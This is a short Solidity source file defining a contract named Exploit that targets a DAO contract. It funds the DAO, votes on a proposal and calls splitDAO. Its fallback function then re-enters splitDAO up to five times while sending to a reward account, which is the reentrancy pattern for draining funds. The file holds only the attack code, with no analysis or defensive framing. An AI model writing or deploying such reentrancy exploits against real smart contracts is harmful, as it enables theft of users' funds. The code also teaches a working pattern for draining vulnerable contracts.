contract DAO {
  function vote(
    uint _proposalID,
    bool _supportsProposal
  ) returns (uint _voteID);

  function splitDAO(
    uint _proposalID,
    address _newCurator
  ) returns (bool _success);
  
  function getNewDAOAddress(uint _proposalID) constant returns (address _newDAO);
}

contract owned {
  address owner;
  function owned() {
    owner = msg.sender;
  }
  function changeOwner(address newOwner) onlyowner {
    owner = newOwner;
  }
  modifier onlyowner() {
    if (msg.sender==owner) _
  }
}

contract Exploit is owned {
  
  DAO dao;
  address rewardAccount;
  address curator;
  uint times = 5;
  uint proposalId;
  
  function Exploit(address _dao, address _rewardAccount, address _curator) {
    dao = DAO(_dao);
    rewardAccount = _rewardAccount;
    curator = _curator;
  }

  function fuel() onlyowner {
    dao.call.value(1 ether)();
  }

  function vote(uint proposalId) onlyowner {
    dao.vote(proposalId, true);
  }

  function splitDAO(uint _proposalId) onlyowner {
    proposalId = _proposalId;
    dao.splitDAO(proposalId, curator);
  }
  
  function () {
    if (times-- > 0) {
      log0("recursive call");
      rewardAccount.send(1000);
      dao.splitDAO(proposalId, curator);
    }
  }
}
